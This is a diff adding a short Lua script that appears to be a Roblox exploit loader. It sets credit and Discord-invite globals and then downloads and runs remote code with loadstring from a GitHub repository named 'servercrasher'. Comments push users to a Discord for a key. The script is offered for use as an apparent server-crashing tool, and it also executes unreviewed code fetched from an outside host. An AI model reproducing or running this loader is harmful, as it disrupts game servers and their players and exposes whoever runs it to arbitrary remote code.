@@ -1,0 +1,5 @@
+--// Join discord for key!
+--// Remove the credits and it wont work!
+getgenv().Credits = "Made by 6Ex!"
+getgenv().discord = "https://discord.com/invite/QcdFN9DpqQ"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/servercrasher/main/master.lua"))()
